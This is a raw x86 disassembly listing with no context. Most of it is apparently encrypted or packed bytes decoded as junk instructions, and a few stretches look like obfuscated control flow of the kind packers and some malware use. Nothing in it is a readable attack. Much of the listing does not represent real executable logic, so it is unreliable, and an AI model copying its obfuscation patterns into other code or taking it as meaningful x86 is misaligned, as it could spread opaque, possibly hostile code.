  405a62:	add    BYTE PTR [esi],cl
  405a64:	fidivr WORD PTR [edx]
  405a66:	test   BYTE PTR [esi+0x1c],dh
  405a69:	jb     0x405ad5
  405a6b:	lock (bad) [esi-0x31b2a5ce]
  405a72:	push   ebp
  405a73:	xlat   BYTE PTR ds:[ebx]
  405a74:	cli    
  405a75:	lock mov dh,0x82
  405a78:	fidivr DWORD PTR [edi-0x41738034]
  405a7e:	xchg   ebx,eax
  405a7f:	sahf   
  405a80:	adc    dh,BYTE PTR [edi+0x7a0e60b8]
  405a86:	nop
  405a87:	inc    ebx
  405a88:	call   0xe8fd57c6
  405a8d:	fidivr WORD PTR [edx+0x18]
  405a90:	push   edx
  405a91:	outs   dx,DWORD PTR ds:[esi]
  405a92:	lahf   
  405a93:	out    0x95,al
  405a95:	xor    eax,0xfb054edb
  405a9a:	add    bl,BYTE PTR [ebp+0x4b]
  405a9d:	les    edx,FWORD PTR ds:0x3fddbe8c
  405aa3:	shl    ebx,cl
  405aa5:	pop    edx
  405aa6:	test   DWORD PTR [edx],edi
  405aa8:	add    edi,DWORD PTR [ebx+edi*4-0x2d]
  405aac:	ja     0x405b14
  405aae:	leave  
  405aaf:	mov    ecx,0x590044e2
  405ab4:	xchg   BYTE PTR [edx],dh
  405ab6:	cmp    al,0x38
  405ab8:	out    dx,eax
  405ab9:	cmp    BYTE PTR [ebx+edx*8+0x58],dh
  405abd:	xor    eax,0xf9dbba32
  405ac2:	jns    0x405ac8
  405ac4:	je     0x405a81
  405ac6:	jmp    DWORD PTR [ebx]
  405ac8:	mov    cl,0xe3
  405aca:	les    edx,FWORD PTR [eax+0x66]
  405acd:	xchg   esp,eax
  405ace:	cld    
  405acf:	pop    ss
  405ad0:	jp     0x405ac4
  405ad2:	mov    bl,0x61
  405ad4:	dec    ebp
  405ad5:	je     0x405a73
  405ad7:	bound  ebp,QWORD PTR [ebp-0x63]
  405ada:	sbb    ah,BYTE PTR [eax]
  405adc:	inc    ebp
  405add:	loop   0x405ac3
  405adf:	xor    DWORD PTR [ebp+0x7aa77d1a],esi
  405ae5:	mov    ecx,0x2852246a
  405aea:	mov    dl,0x90
  405aec:	daa    
  405aed:	call   0x591d:0x36575ed8
  405af4:	jle    0x405aa7
  405af6:	pop    ebx
  405af7:	inc    esp
  405af8:	fsubr  st,st(6)
  405afa:	or     BYTE PTR [ebp+0x1e227adc],cl
  405b00:	push   ebp
  405b01:	mov    ah,0xe7
  405b03:	loopne 0x405a9a
  405b05:	mov    edx,0xb60b7c70
  405b0a:	inc    edx
  405b0b:	cmp    eax,0x978ecf1f
  405b10:	dec    edx
  405b11:	ins    BYTE PTR es:[edi],dx
  405b12:	push   ebx
  405b13:	mov    ds:0x56fcd9f,al
  405b18:	dec    esp
  405b19:	jbe    0x405b14
  405b1b:	inc    ebp
  405b1c:	data16 mov al,ds:0xdaba686
  405b22:	sbb    bh,BYTE PTR [esp+edi*2]
  405b25:	test   eax,0x5fc83e6c
  405b2a:	cmp    al,0x9
  405b2c:	mov    ebx,0x98956d3
  405b31:	test   DWORD PTR [ecx+0x6db9104d],0xc700000c
  405b3b:	inc    ebp
  405b3c:	or     BYTE PTR [ebp-0x38f0cb32],bh
  405b42:	inc    ebp
  405b43:	cld    
  405b44:	test   DWORD PTR ds:[eax+edi*8-0x637acd47],ebx
  405b4c:	clc    
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43381b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x4337d3,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x433823,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x43386f,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x4338af,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0x8081b326
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405bf1
  405be0:	mov    ebx,0x3ad0f5f
  405be5:	outs   dx,DWORD PTR ds:[esi]
  405be6:	out    dx,eax
  405be7:	(bad)  
  405be8:	jns    0x405bac
  405bea:	xor    eax,0x4c25abaa
  405bef:	test   eax,0xdd9a1bed
  405bf4:	pop    ebx
  405bf5:	repnz clc 
  405bf7:	pop    edx
  405bf8:	imul   eax,DWORD PTR [edx+0x33b5a95c],0xffffffe5
  405bff:	jp     0x405b8f
  405c01:	arpl   WORD PTR [ebx+0x60cda72c],bp
  405c07:	fsub   st(3),st
  405c09:	xor    dl,BYTE PTR [ebp+esi*8+0x6527bbe3]
  405c10:	push   0x37
  405c12:	inc    dh
  405c14:	or     dl,cl
  405c16:	popa   
  405c17:	f2xm1  
  405c19:	ret    
  405c1a:	xor    eax,0x84e9b10c
  405c1f:	mov    edx,DWORD PTR [esi-0x7c]
  405c22:	dec    edx
  405c23:	xor    ebp,DWORD PTR [esi-0x47d6fefb]
  405c29:	sbb    DWORD PTR [ebp-0x3915560e],esi
  405c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c30:	mov    cl,0xdc
  405c32:	adc    eax,0x1c0765a2
  405c37:	mov    ebx,0x6ce26705
  405c3c:	mov    ebp,0x4776c14f
  405c41:	mov    bh,0x46
  405c43:	mov    edi,0xa9fe656
  405c48:	xchg   ebx,eax
  405c49:	sub    ebx,DWORD PTR [ecx+ecx*2+0x1116c8b6]
  405c50:	(bad)  
  405c51:	jl     0x405bdf
  405c53:	adc    eax,0x3a6b8a3
  405c58:	es jg  0x405c18
  405c5b:	jb     0x405cb7
  405c5d:	or     al,0x11
  405c5f:	jae    0x405ccd
  405c61:	jecxz  0x405bf2
  405c63:	pop    ebp
  405c64:	out    dx,eax
  405c65:	sbb    al,0xc0
  405c67:	push   es
  405c68:	cmp    eax,0xf03c8c89
  405c6d:	jle    0x405c8f
  405c6f:	cmp    al,BYTE PTR [ebx-0x50]
  405c72:	pop    ds
  405c73:	cmp    ah,BYTE PTR ds:0x631f3844
  405c79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c7a:	loopne 0x405c7d
  405c7c:	cmp    DWORD PTR [edi+0x5f],ebx
  405c7f:	push   0xb4178751
  405c84:	bound  edi,QWORD PTR [eax]
  405c86:	scas   al,BYTE PTR es:[edi]
  405c87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c88:	call   0xc155:0x14e890ae
  405c8f:	out    0x38,eax
  405c91:	gs mov dl,0x8d
  405c94:	or     eax,0x71ad45b3
  405c99:	inc    edx
  405c9a:	outs   dx,DWORD PTR ds:[esi]
  405c9b:	repnz test DWORD PTR [ebp+0x7e],0x53593dfd
  405ca3:	sub    ecx,DWORD PTR [ebp-0x67]
  405ca6:	inc    esp
  405ca7:	out    dx,al
  405ca8:	stos   BYTE PTR es:[edi],al
  405ca9:	inc    ecx
  405caa:	push   ss
  405cab:	pusha  
  405cac:	lock jne 0x405d19
  405caf:	sbb    DWORD PTR [esi],0x3b
  405cb2:	mov    eax,ds:0xecd31571
  405cb7:	sbb    esi,DWORD PTR [edi+esi*4-0x3a]
  405cbb:	pop    edi
  405cbc:	pop    ds
  405cbd:	mov    eax,ds:0xda59f16c
  405cc2:	fld    QWORD PTR [ecx-0x61c5cfe2]
  405cc8:	xor    ecx,DWORD PTR [ebp-0x31]
  405ccb:	xchg   BYTE PTR [edx+0x77715421],bl
  405cd1:	mov    ebx,0x12553884
  405cd6:	xchg   ecx,eax
  405cd7:	into   
  405cd8:	sub    DWORD PTR [ecx],edi
  405cda:	xor    al,BYTE PTR [eax]
  405cdc:	(bad)  
  405cdf:	clc    
  405ce0:	ss jo  0x405cef
  405ce3:	mov    ah,0x1e
  405ce5:	call   0x3fd9:0xd379cd1c
  405cec:	dec    esp
  405ced:	or     DWORD PTR [edi+ecx*8-0x1ca38849],esp
  405cf4:	lea    ecx,[esp+esi*8-0x1a]
  405cf8:	aad    0x14
  405cfa:	sbb    al,0x34
  405cfc:	mov    eax,0x8c740585
  405d01:	in     al,0x83
  405d03:	daa    
  405d04:	(bad)  [ebp+0x76]
  405d07:	dec    edi
  405d08:	push   0x257c660d
  405d0d:	sahf   
  405d0e:	ins    BYTE PTR es:[edi],dx
  405d0f:	out    dx,eax
  405d10:	ret    0x274f
  405d13:	fs leave 
  405d15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d16:	jnp    0x405cf4
  405d18:	jl     0x405d7e
  405d1a:	(bad)  
  405d1b:	cmp    DWORD PTR [edi-0x1a253c0f],ebp
  405d21:	push   es
  405d22:	ret    0x9cd8
  405d25:	jle    0x405cbc
  405d27:	aas    
  405d28:	or     edi,eax
  405d2a:	pop    es
  405d2b:	xor    al,0x88
  405d2d:	xchg   DWORD PTR [esi+0x5994bf23],ebx
  405d33:	sbb    dh,BYTE PTR [edi+0x3ea83c63]
  405d39:	into   
  405d3a:	shl    DWORD PTR [eax-0x1184cd65],1
  405d40:	pop    edx
  405d41:	fs inc ebx
  405d43:	or     al,0x31
  405d45:	fist   DWORD PTR [esi-0x68]
  405d48:	inc    edx
  405d49:	shl    esi,1
  405d4b:	mov    edi,0x9f46e74
  405d50:	dec    esp
  405d51:	and    eax,0x721b55f6
  405d56:	mov    edx,0x9e61f094
  405d5b:	inc    eax
  405d5c:	shr    DWORD PTR [ebx],cl
  405d5e:	sub    al,0x80
  405d60:	xchg   edx,eax
  405d61:	adc    eax,0xdd196f60
  405d66:	and    ah,BYTE PTR [esi]
  405d68:	xchg   BYTE PTR [ecx],cl
  405d6a:	lds    eax,FWORD PTR [esi-0x751901a9]
  405d70:	fcmovnbe st,st(5)
  405d72:	xor    ebp,DWORD PTR [ecx]
  405d74:	cmp    esi,DWORD PTR [esi+0x6c30c47a]
  405d7a:	and    DWORD PTR [eiz*4+0xc4068ba],0x79
  405d82:	in     eax,dx
  405d83:	or     al,0xb6
  405d85:	lahf   
  405d86:	mov    BYTE PTR [edx-0x6f60c1ed],ch
  405d8c:	bound  esp,QWORD PTR [edx+0x78]
  405d8f:	mov    edi,0xeb2054c3
  405d94:	cmp    DWORD PTR [ecx+0x74],ebp
  405d97:	mov    al,ds:0x324c3323
  405d9c:	sub    eax,0xb754393f
  405da1:	fnsave [ecx+0x7e]
  405da4:	hlt    
  405da5:	aam    0x47
  405da7:	mov    eax,0xe2aaa74d
  405dac:	and    DWORD PTR [ebx+0x2b6ebcb7],0x6558b651
  405db6:	sbb    al,0xec
  405db8:	inc    esp
  405db9:	add    al,BYTE PTR [edx-0x23]
  405dbc:	loopne 0x405e3a
  405dbe:	push   es
  405dbf:	dec    esi
  405dc0:	or     eax,DWORD PTR [eax]
  405dc2:	sub    al,0xc7
  405dc4:	bound  ebp,QWORD PTR [edi-0x11c09077]
  405dca:	fndisi(8087 only) 
  405dcc:	lds    eax,FWORD PTR [ecx+0x73]
  405dcf:	popa   
  405dd0:	std    
  405dd1:	mov    eax,DWORD PTR [ebx-0x58]
  405dd4:	test   BYTE PTR [esi-0xd],ch
  405dd7:	push   esp
  405dd8:	rcl    DWORD PTR [eax],cl
  405dda:	nop
  405ddb:	outs   dx,BYTE PTR ds:[esi]
  405ddc:	and    al,0xf0
  405dde:	mov    al,BYTE PTR ss:0x154f5d29
  405de5:	ret    0xa246
  405de8:	(bad)  
  405de9:	adc    eax,0x97f206e3
  405dee:	pop    ebp
  405def:	and    dh,dl
  405df1:	out    dx,al
  405df2:	inc    edx
  405df3:	js     0x405e4b
  405df5:	jne    0x405ddc
  405df7:	push   ss
  405df8:	mov    eax,ds:0xce856a57
  405dfd:	shr    ecx,1
  405dff:	and    BYTE PTR [edx],ah
  405e01:	dec    esp
  405e02:	cmp    DWORD PTR ds:[ecx-0x2212b802],ebp
  405e09:	ret    0xfea5
  405e0c:	popf   
  405e0d:	add    BYTE PTR [ebx+0x6b],bl
  405e10:	add    edi,esp
  405e12:	xchg   edi,eax
  405e13:	ror    BYTE PTR [edi],cl
  405e15:	jne    0x405e5d
  405e17:	shl    BYTE PTR [ebx+0x27a4e9cd],cl
  405e1d:	or     eax,0x66bed058
  405e22:	mov    al,ds:0x6d9a576d
  405e27:	sub    DWORD PTR ds:0xbbc49a04,edi
  405e2d:	outs   dx,DWORD PTR ds:[esi]
  405e2e:	pop    ds
  405e2f:	ja     0x405e3b
  405e31:	adc    al,0xf6
  405e33:	out    0xb5,al
  405e35:	or     BYTE PTR [edx+edx*4],ah
  405e38:	je     0x405ea3
  405e3a:	or     ecx,edx
  405e3c:	mov    dl,0xf6
  405e3e:	dec    ecx
  405e3f:	pop    edi
  405e40:	xchg   esi,eax
  405e41:	test   bh,0x47
  405e44:	or     edx,eax
  405e46:	dec    ebx
  405e47:	cld    
  405e48:	add    al,0x55
  405e4a:	iret   
  405e4b:	inc    ebp
  405e4c:	enter  0x49fd,0x67
  405e50:	fstp   DWORD PTR [edi+0x47]
  405e53:	stos   BYTE PTR es:[edi],al
  405e54:	xor    eax,0x309480e4
  405e59:	cmp    DWORD PTR [eax],0x726470a9
  405e5f:	fwait
  405e60:	jbe    0x405e56
  405e62:	bnd jb 0x405e70
  405e65:	push   ds
  405e66:	push   ss
  405e67:	int3   
  405e68:	fwait
  405e69:	clc    
  405e6a:	add    al,0xfd
  405e6c:	lods   al,BYTE PTR ds:[esi]
  405e6d:	mov    bh,0x7b
  405e6f:	xchg   ebx,eax
  405e70:	stos   BYTE PTR es:[edi],al
  405e71:	imul   esp,DWORD PTR [edi],0x0
  405e74:	aas    
  405e75:	dec    esp
  405e76:	div    DWORD PTR [ebx]
  405e78:	xchg   cl,al
  405e7a:	lods   eax,DWORD PTR ds:[esi]
  405e7b:	xchg   BYTE PTR [ecx+0x1f],bl
  405e7e:	jmp    0x405edf
  405e80:	mov    esi,0x1321732d
  405e85:	mov    ah,0xa6
  405e87:	rcr    DWORD PTR [esi+0x2d96a58d],0x6
  405e8e:	cli    
  405e8f:	hlt    
  405e90:	sub    al,0x61
  405e92:	into   
  405e93:	aam    0x11
  405e95:	imul   esp,DWORD PTR [esi-0x2bf6ba32],0x7b664567
  405e9f:	dec    edi
  405ea0:	leave  
  405ea1:	jae    0x405edf
  405ea3:	clc    
  405ea4:	stos   BYTE PTR es:[edi],al
  405ea5:	or     edx,DWORD PTR [edi+ebp*1-0x52b2c2eb]
  405eac:	stc    
  405ead:	dec    ecx
  405eae:	mov    esp,0x91da0ee9
  405eb3:	outs   dx,DWORD PTR ds:[esi]
  405eb4:	repnz daa 
  405eb6:	or     BYTE PTR [eax],bh
  405eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405eb9:	adc    dx,0xa494
  405ebe:	pop    esp
  405ebf:	rcr    BYTE PTR [esi+0x7895e11f],0xba
  405ec6:	outs   dx,BYTE PTR ds:[esi]
  405ec7:	repnz jecxz 0x405ea4
  405eca:	mov    al,ds:0xffe1334
  405ecf:	mov    esp,0x7af041b1
  405ed4:	repz int 0x91
  405ed7:	repz push esi
  405ed9:	int3   
  405eda:	out    0x29,eax
  405edc:	xchg   cl,al
  405ede:	daa    
  405edf:	pop    eax
  405ee0:	rcr    esi,cl
  405ee2:	cwde   
  405ee3:	pop    ss
  405ee4:	imul   ebp,DWORD PTR [edi+0x1d],0x46
  405ee8:	mov    dh,0x2e
  405eea:	xor    BYTE PTR [ecx-0x7e31b658],0x9e
  405ef1:	cli    
  405ef2:	cmp    dl,BYTE PTR [esi+ecx*1+0x2a]
  405ef6:	jp     0x405f77
  405ef8:	add    BYTE PTR [ecx],bh
  405efa:	xor    cl,BYTE PTR [edx-0x1d]
  405efd:	xchg   BYTE PTR [bx+si-0x1141],dl
  405f02:	out    dx,eax
  405f03:	repnz popa 
  405f05:	mov    BYTE PTR [edx*8-0x2e0973a3],dh
  405f0c:	xor    eax,0x5707ce02
  405f11:	xor    esi,ecx
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [ebx+0x31],ds
  405f28:	fisttp DWORD PTR [esi-0x5a]
  405f2b:	xor    BYTE PTR [esi+0x7e],bh
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	mov    dl,BYTE PTR [ebx-0x527039d2]
  405f38:	cmp    bh,dh
  405f3a:	pop    ss
  405f3b:	cmp    ecx,DWORD PTR [edi+0x25]
  405f3e:	jmp    0x3f1e92ac
  405f43:	fidiv  WORD PTR [edx+edi*8]
  405f46:	adc    eax,0x1f247664
  405f4b:	inc    ebx
  405f4c:	arpl   WORD PTR [edi+0x8],ax
  405f4f:	test   eax,0xd79c9ced
  405f54:	test   DWORD PTR [ecx],esi
  405f56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f57:	sbb    esi,ecx
  405f59:	ins    BYTE PTR es:[edi],dx
  405f5a:	push   cs
  405f5b:	lods   eax,DWORD PTR ds:[esi]
  405f5c:	mov    edx,0xd7afe09a
  405f61:	scas   eax,DWORD PTR es:[edi]
  405f62:	ficom  WORD PTR [edi]
  405f64:	pop    edi
  405f65:	inc    ecx
  405f66:	(bad)  
  405f67:	(bad)  
  405f68:	sub    eax,0x3f66ce97
  405f6d:	add    al,BYTE PTR [edi+eax*8+0x834f671]
  405f74:	mov    BYTE PTR [eax+0x428a98df],al
  405f7a:	jge    0x405f90
  405f7c:	std    
  405f7d:	leave  
  405f7e:	adc    BYTE PTR [ebp+0x3d],ah
  405f81:	jl     0x405f54
  405f83:	call   0x5e4e8833
  405f88:	sbb    eax,0x61479718
  405f8d:	stos   DWORD PTR es:[edi],eax
  405f8e:	sub    edx,DWORD PTR [ebp+0x2c374d27]
  405f94:	les    ecx,FWORD PTR [edi]
  405f96:	xchg   edx,eax
  405f97:	cmp    ah,BYTE PTR [edx+0x3f]
  405f9a:	xlat   BYTE PTR ds:[ebx]
  405f9b:	(bad)
  405f9e:	aaa    
  405f9f:	or     BYTE PTR [edx-0x7af350e6],al
  405fa5:	sbb    eax,0xfa498836
  405faa:	mov    WORD PTR ds:0x5b9d777a,fs
  405fb0:	pushf  
  405fb1:	pop    ebx
  405fb2:	in     eax,dx
  405fb3:	add    eax,DWORD PTR [ecx-0x6a]
  405fb6:	loopne 0x40600f
  405fb8:	mov    edx,0x6be8fffd
  405fbd:	mov    BYTE PTR [ebp+0x5613efd6],ah
  405fc3:	cmp    BYTE PTR [ebx+0x24],0x85
  405fc7:	popf   
  405fc8:	mov    bl,0x83
  405fca:	in     eax,dx
  405fcb:	sub    al,BYTE PTR ds:0x4331f8e1
  405fd1:	mov    ah,0x39
  405fd3:	ss inc esp
  405fd5:	sub    DWORD PTR [ecx+0x5585575f],esp
  405fdb:	rcl    BYTE PTR [edx+0x4c761bfe],cl
  405fe1:	cld    
  405fe2:	mov    BYTE PTR [ebx],dh
  405fe4:	add    BYTE PTR [ecx+0x1],bl
  405fe7:	dec    esp
  405fe8:	lods   eax,DWORD PTR ds:[esi]
  405fe9:	xchg   esi,eax
  405fea:	jne    0x405f9d
  405fec:	popa   
  405fed:	mov    ds:0x58da399f,eax
  405ff2:	jg     0x406050
  405ff4:	and    BYTE PTR [ecx+eiz*8+0x63a8ba41],dl
  405ffb:	or     ah,al
  405ffd:	inc    edi
  405ffe:	jle    0x406016
  406000:	lds    ebx,FWORD PTR [ecx+0x64]
  406003:	or     edx,esp
  406005:	mov    ebp,0x96e27003
  40600a:	ds mov edi,0xc825eea4
  406010:	sub    dl,bh
  406012:	(bad)  
  406013:	jmp    0x406054
  406015:	add    dl,0x9d
  406018:	arpl   di,ax
  40601a:	inc    edi
  40601b:	(bad)  
  40601d:	mov    eax,ds:0xf2d45727
  406022:	push   esi
  406023:	or     bl,BYTE PTR [edx-0x1f]
  406026:	and    BYTE PTR [ecx+eax*2+0x40],bl
  40602a:	lods   al,BYTE PTR ds:[esi]
  40602b:	leave  
  40602c:	sti    
  40602d:	add    edx,DWORD PTR [eax-0x7e1588ce]
  406033:	in     al,dx
  406034:	pop    esp
  406035:	leave  
  406036:	retf   
  406037:	aas    
  406038:	cld    
  406039:	iret   
  40603a:	mov    ch,0x1
  40603c:	(bad)  
  40603d:	scas   eax,DWORD PTR es:[edi]
  40603e:	test   al,0xb1
  406040:	mul    DWORD PTR [edx+edi*1]
  406043:	fdiv   QWORD PTR [ebx]
  406045:	push   ebp
  406046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406047:	pusha  
  406048:	ss push edi
  40604a:	jne    0x406045
  40604c:	dec    esi
  40604d:	scas   al,BYTE PTR es:[edi]
  40604e:	jbe    0x406089
  406050:	mov    cs,WORD PTR [eax+0x4e2e2902]
  406056:	stos   DWORD PTR es:[edi],eax
  406057:	shr    BYTE PTR [esp+ebx*2-0x75],cl
  40605b:	in     eax,0x89
  40605d:	fistp  DWORD PTR [edx+eax*4-0x7bb21e98]
  406064:	fcmovbe st,st(3)
  406066:	sbb    eax,DWORD PTR [ebx]
  406068:	pushf  
  406069:	ret    
  40606a:	jno    0x4060b7
  40606c:	jbe    0x4060b7
  40606e:	outs   dx,DWORD PTR ds:[esi]
  40606f:	mov    WORD PTR [ecx],?
  406071:	xchg   bh,dl
  406073:	xchg   ecx,eax
  406074:	inc    edi
  406075:	cmp    DWORD PTR [eax+0x655e07f5],0x59
  40607c:	xchg   edx,eax
  40607d:	stos   BYTE PTR es:[edi],al
  40607e:	inc    ebp
  40607f:	push   edx
  406080:	test   DWORD PTR [eax],ebx
  406082:	data16 fcomp QWORD PTR ds:0x43cabdb7
  406089:	sub    BYTE PTR [esi-0x5dca7e40],ch
  40608f:	jp     0x406100
  406091:	inc    edi
  406092:	out    0xb0,eax
  406094:	sub    eax,0xe66bb1e5
  406099:	pusha  
  40609a:	aaa    
  40609b:	xchg   eax,edi
  40609d:	js     0x40606b
  40609f:	and    esp,edi
  4060a1:	setp   ch
  4060a4:	and    edi,ebx
  4060a6:	(bad)  
  4060a7:	fwait
  4060a8:	inc    esp
  4060a9:	xor    bl,BYTE PTR [ebx]
  4060ab:	and    DWORD PTR [eax+0x4ce14fa0],esi
  4060b1:	xchg   edx,eax
  4060b2:	out    0x27,eax
  4060b4:	mov    ah,0xcf
  4060b6:	add    eax,0x14aa29b0
  4060bb:	jo     0x4060ec
  4060bd:	xchg   ecx,eax
  4060be:	sar    DWORD PTR [esp+edi*8-0x5],cl
  4060c2:	pop    es
  4060c3:	sub    eax,0xbc3a146f
  4060c8:	sti    
  4060c9:	jns    0x406138
  4060cb:	test   BYTE PTR [eax+0x5e],dh
  4060ce:	(bad)  
  4060cf:	pop    edi
  4060d0:	or     edi,edi
  4060d2:	ret    
  4060d3:	push   cs
  4060d4:	pushf  
  4060d5:	vmwrite ebx,DWORD PTR [edx]
  4060d8:	ins    BYTE PTR es:[edi],dx
  4060d9:	stos   DWORD PTR es:[edi],eax
  4060da:	loopne 0x4060d3
  4060dc:	add    eax,0xd6c523c9
  4060e1:	repz pushf 
  4060e3:	xlat   BYTE PTR ds:[ebx]
  4060e4:	or     eax,0x4476aad2
  4060e9:	out    0xd6,eax
  4060eb:	jb     0x40615f
  4060ed:	mov    eax,ds:0x6f4b6e21
  4060f2:	adc    ebp,edx
  4060f4:	in     eax,0x36
  4060f6:	ret    
  4060f7:	jl     0x40613c
  4060f9:	or     DWORD PTR [ebp+0x5e],esi
  4060fc:	ss mov eax,0xbce8b06e
  406102:	jmp    0x40612a
  406104:	jecxz  0x4060ba
  406106:	push   esp
  406107:	jmp    0x2a0ec8f4
  40610c:	into   
  40610d:	popa   
  40610e:	mov    BYTE PTR [esi+0x79],dh
  406111:	sub    bh,bh
  406113:	jmp    0x9156ba52
  406118:	cmp    BYTE PTR [ebp+0x3c2c518b],0xb3
  40611f:	jl     0x406133
  406121:	pop    ds
  406122:	jne    0x40611d
  406124:	inc    edx
  406125:	jnp    0x4060ba
  406127:	xor    BYTE PTR [eax],cl
  406129:	inc    ecx
  40612a:	stc    
  40612b:	daa    
  40612c:	and    BYTE PTR [ebx+edi*1-0xaceee06],bl
  406133:	jbe    0x4061ae
  406135:	pusha  
  406136:	jg     0x40619d
  406138:	(bad)  
  406139:	xchg   BYTE PTR [ebx],dh
  40613b:	rcr    BYTE PTR [ecx+0x55cb57f7],1
  406141:	aaa    
  406142:	or     BYTE PTR [ecx+ebx*8],ah
  406145:	test   al,0xf9
  406147:	sub    eax,0x93682ac0
  40614c:	imul   edx,DWORD PTR [ebp-0x53],0x76
  406150:	test   ebp,edi
  406152:	jle    0x40610b
  406154:	pushf  
  406155:	popf   
  406156:	mov    edi,0xccdb0861
  40615b:	data16 (bad) 
  40615d:	mov    dh,0x1b
  40615f:	xor    al,0x9a
  406161:	jo     0x406161
  406163:	idiv   bl
  406165:	popf   
  406166:	lea    edx,[ebp+0x37]
  406169:	call   0x5d8b5132
  40616e:	je     0x4061a1
  406170:	jge    0x406155
  406172:	outs   dx,DWORD PTR ds:[esi]
  406173:	mov    al,0xf6
  406175:	fiadd  DWORD PTR [ebp-0x28a5380a]
  40617b:	pop    ebx
  40617c:	mov    ebx,0x530c8ac4
  406181:	fnstcw WORD PTR [ecx]
  406183:	(bad)  [edi]
  406185:	add    edi,DWORD PTR [eax-0x2ff174e4]
  40618b:	ins    DWORD PTR es:[edi],dx
  40618c:	mov    ah,0x65
  40618e:	xlat   BYTE PTR ds:[ebx]
  40618f:	loop   0x4061e7
  406191:	out    dx,al
  406192:	xchg   esi,eax
  406193:	mov    bh,0x29
  406195:	pop    es
  406196:	jge    0x406153
  406198:	cmc    
  406199:	ret    0xda50
  40619c:	xchg   esp,eax
  40619d:	shl    BYTE PTR [edi+0x7b],0xa3
  4061a1:	cs sti 
  4061a3:	dec    esp
  4061a4:	push   0xc609bcfd
  4061a9:	jle    0x406142
  4061ab:	imul   esi,DWORD PTR [ebx+0x2c],0xffffffab
  4061af:	push   ss
  4061b0:	push   es
  4061b1:	push   ss
  4061b2:	std    
  4061b3:	and    al,0x9e
  4061b5:	mov    dh,0x69
  4061b7:	mov    ch,dh
  4061b9:	lahf   
  4061ba:	test   DWORD PTR [edx-0x7],esi
  4061bd:	mov    eax,ds:0xbb95606b
  4061c2:	dec    edx
  4061c3:	xor    ch,BYTE PTR [ebx-0x11]
  4061c6:	retf   
  4061c7:	out    0xfc,eax
  4061c9:	pusha  
  4061ca:	inc    eax
  4061cb:	inc    eax
  4061cc:	lahf   
  4061cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061ce:	(bad)  
  4061cf:	and    esi,edx
  4061d1:	jns    0x4061b2
  4061d3:	or     bl,BYTE PTR [edx+0x4f]
  4061d6:	fsubr  DWORD PTR [edx+ecx*2-0x60]
  4061da:	adc    al,0xc7
  4061dc:	add    ecx,DWORD PTR [ecx-0x3599075c]
  4061e2:	loope  0x406222
  4061e4:	ins    BYTE PTR es:[edi],dx
  4061e5:	mov    ecx,0xaff65874
  4061ea:	ja     0x40617a
  4061ec:	rol    ebp,1
  4061ee:	add    al,0x72
  4061f0:	mov    eax,ds:0x236f3409
  4061f5:	imul   DWORD PTR [edi+0x30]
  4061f8:	sbb    esi,ecx
  4061fa:	loopne 0x40624b
  4061fc:	jle    0x406223
  4061fe:	mov    ds:0xb8d7eb37,al
  406203:	jle    0x4061f7
  406205:	jecxz  0x40621e
  406207:	ins    BYTE PTR es:[edi],dx
  406208:	jg     0x4061a7
  40620a:	stos   BYTE PTR es:[edi],al
  40620b:	mov    ah,0xd8
  40620d:	push   ss
  40620e:	int    0x0
  406210:	push   0x63
  406212:	xchg   esp,eax
  406213:	adc    eax,0xb33828d1
  406218:	push   ebx
  406219:	bound  ecx,QWORD PTR [eax-0x2f973f98]
  40621f:	mov    WORD PTR [eax+0x2e0fc701],?
  406225:	rcl    BYTE PTR [ecx+0x4f7ac84e],cl
  40622b:	aad    0xc4
  40622d:	dec    esi
  40622e:	stc    
  40622f:	rcl    dl,cl
  406231:	in     al,0xc1
  406233:	push   ecx
  406234:	loopne 0x40629b
  406236:	push   0x94fc816b
  40623b:	mov    DWORD PTR [ebp+0x56c537f8],0x4517bc03
  406245:	and    BYTE PTR [esp+eiz*4+0x3b6a768d],dl
  40624c:	(bad)  
  40624d:	push   ebx
  40624e:	in     al,0x3d
  406250:	xlat   BYTE PTR ds:[ebx]
  406251:	scas   al,BYTE PTR es:[edi]
  406252:	cdq    
  406253:	fwait
  406254:	ins    DWORD PTR es:[edi],dx
  406255:	mov    dh,0xcb
  406257:	sti    
  406258:	inc    esp
  406259:	add    bl,BYTE PTR [ecx+eax*4-0x2979a342]
  406260:	push   ds
  406261:	cmp    ch,dh
  406263:	es xor esi,eax
  406266:	and    DWORD PTR ds:0x4338a3,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x4338a3
  40627b:	inc    ecx
